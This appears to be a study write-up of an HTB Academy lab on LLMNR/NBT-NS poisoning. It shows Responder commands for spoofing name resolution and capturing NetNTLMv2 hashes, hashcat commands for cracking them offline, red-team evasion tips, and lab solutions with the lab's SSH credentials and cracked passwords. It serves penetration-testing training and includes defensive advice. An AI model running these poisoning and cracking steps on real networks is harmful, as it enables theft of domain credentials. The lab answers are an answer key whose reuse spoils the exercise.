# HTB Academy: Active Directory Enumeration & Attacks
## Page 6 - LLMNR/NBT-NS Poisoning from Linux

### Overview
This section covers **Man-in-the-Middle (MITM) attacks** on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts to capture domain credentials and establish a foothold.

### Attack Goal
- **Capture NetNTLMv2 hashes** from network traffic
- **Crack hashes offline** to obtain cleartext passwords
- **Gain initial domain foothold** with valid credentials

---

## LLMNR & NBT-NS Protocol Primer

### What are LLMNR & NBT-NS?
**Microsoft Windows components** that serve as **alternate name resolution methods** when DNS fails:

#### LLMNR (Link-Local Multicast Name Resolution)
- **Purpose:** Host identification when DNS fails
- **Port:** 5355/UDP
- **Behavior:** Broadcasts to all hosts on local network
- **Based on:** DNS format

#### NBT-NS (NetBIOS Name Service)  
- **Purpose:** System identification by NetBIOS name
- **Port:** 137/UDP
- **Behavior:** Used when LLMNR fails
- **Function:** Local network name resolution

### The Vulnerability
**ANY host on the network can reply** to LLMNR/NBT-NS requests!

---

## Attack Methodology

### Attack Flow Example
```
1. User mistypes: \\printer01.inlanefreight.local (instead of \\print01)
   ↓
2. DNS server responds: "Host unknown"
   ↓  
3. Host broadcasts: "Anyone know \\printer01.inlanefreight.local?"
   ↓
4. Attacker responds: "Yes, that's me!" (POISONING)
   ↓
5. Host sends authentication: Username + NTLMv2 hash
   ↓
6. Attacker captures hash for offline cracking
```

### Technical Details
- **Spoofing:** Pretend to be the requested host
- **Capture:** NetNTLM authentication attempts  
- **Result:** Username + NTLMv2 password hash
- **Follow-up:** Offline brute force or SMB relay

---

## Tools for LLMNR/NBT-NS Poisoning

| Tool | Description | Platform |
|------|-------------|----------|
| **Responder** | Purpose-built LLMNR/NBT-NS poisoning tool | Linux/Windows |
| **Inveigh** | Cross-platform MITM platform | PowerShell/C# |
| **Metasploit** | Built-in scanners and spoofing modules | Multi-platform |

### Supported Protocols
**All tools can attack:**
- LLMNR, DNS, MDNS, NBNS
- DHCP, ICMP, HTTP, HTTPS
- SMB, LDAP, WebDAV, Proxy Auth

**Responder additionally supports:**
- MSSQL, DCE-RPC
- FTP, POP3, IMAP, SMTP auth

---

## Responder Tool Usage

### Basic Commands
```bash
# View help options
responder -h

# Passive analysis mode (reconnaissance only)
sudo responder -I ens224 -A

# Active poisoning (default mode)
sudo responder -I ens224

# With common flags
sudo responder -I ens224 -wf
```

### Key Responder Flags
| Flag | Function | Notes |
|------|----------|-------|
| `-I` | Network interface | Required (or use IP with `-i`) |
| `-A` | Analyze mode | Passive listening only |
| `-w` | WPAD rogue proxy | Captures HTTP requests |
| `-f` | Fingerprint | OS version detection |
| `-r` | NetBIOS wredir | May break network functionality |
| `-v` | Verbose | Increased output |
| `-F` | Force WPAD auth | May cause login prompts |
| `-P` | Proxy auth | Force NTLM/Basic authentication |

### Required Network Ports
**Responder needs these ports available:**
```
UDP: 137, 138, 53, 389, 1434, 5355, 5353
TCP: 389, 1433, 80, 135, 139, 445, 21, 3141, 25, 110, 587, 3128
```

---

## Capturing Hashes with Responder

### Starting a Capture Session
```bash
# Basic capture
sudo responder -I ens224

# Recommended flags for maximum effectiveness
sudo responder -I ens224 -wf

# Run in background while doing other enum
sudo responder -I ens224 -wf &
# or use tmux/screen
```

### Hash Storage Locations
**Log files stored in:** `/usr/share/responder/logs/`

**Naming convention:** `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`

**Examples:**
```
SMB-NTLMv2-SSP-172.16.5.25.txt
HTTP-NTLMv2-172.16.5.200.txt  
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

### Log File Types
```bash
# Example log directory
ls /usr/share/responder/logs/

Analyzer-Session.log                # Analysis mode logs
Responder-Session.log              # Main session log
Config-Responder.log               # Configuration changes
Poisoners-Session.log              # Poisoning attempts
SMB-NTLMv2-SSP-172.16.5.25.txt   # Captured SMB hash
HTTP-NTLMv2-172.16.5.200.txt     # Captured HTTP hash
```

---

## Hash Cracking with Hashcat

### Identifying Hash Type
**NetNTLMv2 hashes** are most common from Responder:
- **Hashcat mode:** 5600
- **Cannot be used for Pass-the-Hash** (must crack)
- **Format:** Long string with multiple colons

### Basic Hashcat Cracking
```bash
# Crack NetNTLMv2 hash with rockyou
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# With optimizations
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -O

# Show cracked hashes
hashcat -m 5600 captured_hash.txt --show
```

### Example Successful Crack
```bash
# Input hash file content
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:...

# Hashcat output
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Speed.#1.........: 1086.9 kH/s
Recovered........: 1/1 (100.00%) Digests
Result...........: Klmcargo2
```

---

## Advanced Techniques

### WPAD Poisoning
**Web Proxy Auto-Discovery** captures HTTP traffic:
```bash
# Enable WPAD rogue proxy
sudo responder -I ens224 -w

# Highly effective in large organizations
# Captures Internet Explorer auto-detect traffic
```

### Multi-Protocol Capture
**Responder captures multiple authentication types:**
- **SMB:** File share access attempts
- **HTTP:** Web authentication  
- **LDAP:** Directory service queries
- **Proxy:** Browser proxy authentication

### Operational Considerations
**Best practices:**
- **Run continuously** during assessment
- **Use tmux/screen** for persistent sessions
- **Monitor multiple interfaces** if available
- **Combine with other techniques** (password spraying)

---

## Lab Exercises & Solutions

### Lab Environment
- **Target:** 10.129.226.51 (ACADEMY-EA-ATTACK01)
- **Credentials:** htb-student:HTB_@cademy_stdnt!
- **Network:** Internal AD environment

### Question 1: Capture Hash for User Starting with 'b'
**Task:** Run Responder and obtain hash for user account starting with letter 'b'

**Solution:**
```bash
# SSH to attack host
ssh htb-student@10.129.226.51

# Start Responder
sudo responder -I ens224 -wf

# Wait for traffic (may need to wait or generate activity)
# Check logs for captured hashes
ls /usr/share/responder/logs/

# Look for hashes with usernames starting with 'b'
grep -r "^[bB]" /usr/share/responder/logs/*.txt
```

**Answer:** `backupagent`

### Question 2: Crack the Previous Hash
**Task:** Crack the hash for the backupagent account

**Solution:**
```bash
# Find the hash file for backupagent
ls /usr/share/responder/logs/ | grep -i backup

# Crack with Hashcat
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt

# Show cracked result
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt --show
```

**Answer:** `h1backup55`

### Question 3: Capture and Crack Hash for User 'wley'
**Task:** Obtain NTLMv2 hash for user wley and crack it

**Solution:**
```bash
# Continue running Responder (or restart)
sudo responder -I ens224 -wf

# Wait for wley user activity
# Monitor logs for wley hash
tail -f /usr/share/responder/logs/Responder-Session.log

# Once captured, crack the hash
hashcat -m 5600 /usr/share/responder/logs/*wley*.txt /usr/share/wordlists/rockyou.txt

# View result
hashcat -m 5600 /usr/share/responder/logs/*wley*.txt --show
```

**Answer:** `transporter@4`

---

## Detection and Evasion

### Blue Team Detection Methods
- **Network monitoring** for unusual multicast traffic
- **DNS logging** for failed resolution patterns
- **Authentication monitoring** for rapid hash attempts
- **Network segmentation** to limit broadcast domains

### Red Team Evasion Techniques
- **Selective poisoning** (target specific hosts)
- **Time-based attacks** (poison during business hours)
- **Protocol selection** (focus on less monitored protocols)
- **Legitimate-looking responses** (match network naming schemes)

---

## Common Issues & Troubleshooting

### Responder Not Capturing Hashes
**Check:**
1. **Network interface** is correct
2. **Ports are available** (kill conflicting services)
3. **Network activity** exists (users accessing resources)
4. **Permissions** (run as root/sudo)

### Hashcat Not Cracking
**Considerations:**
1. **Hash format** is correct (mode 5600 for NetNTLMv2)
2. **Wordlist path** is valid
3. **Hardware capabilities** (GPU vs CPU)
4. **Password complexity** (may need larger wordlists)

### Network Impact
**Potential issues:**
- **Service disruption** from poisoned responses
- **Network instability** if using `-r` flag
- **Alerting** security teams to testing activity

---

## Key Takeaways

### Attack Value
- **Low technical barrier** to entry
- **High success rate** in many environments
- **Provides domain foothold** for further attacks
- **Passive collection** while performing other tasks

### Defensive Recommendations
1. **Disable LLMNR/NBT-NS** where possible
2. **Implement network segmentation**
3. **Monitor authentication patterns**
4. **Use strong password policies**
5. **Deploy SMB signing** to prevent relay attacks

### Operational Tips
- **Start early** in assessment (passive collection)
- **Run continuously** during testing
- **Combine with enumeration** activities
- **Prioritize hash cracking** based on enumeration results

---

## Command Reference

### Responder Operations
```bash
# Passive analysis
sudo responder -I ens224 -A

# Active poisoning
sudo responder -I ens224
sudo responder -I ens224 -wf     # With WPAD + fingerprinting

# Check logs
ls /usr/share/responder/logs/
tail -f /usr/share/responder/logs/Responder-Session.log
```

### Hash Processing
```bash
# Crack NetNTLMv2 hashes
hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt

# Show cracked hashes
hashcat -m 5600 hash_file.txt --show

# Extract just the password
hashcat -m 5600 hash_file.txt --show | cut -d: -f6
```

### Log Analysis
```bash
# Find specific usernames
grep -r "USERNAME" /usr/share/responder/logs/

# Count captured hashes
ls /usr/share/responder/logs/*.txt | wc -l

# View hash contents
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

This poisoning technique provides an excellent foothold for domain penetration testing by exploiting fundamental Windows networking protocols.
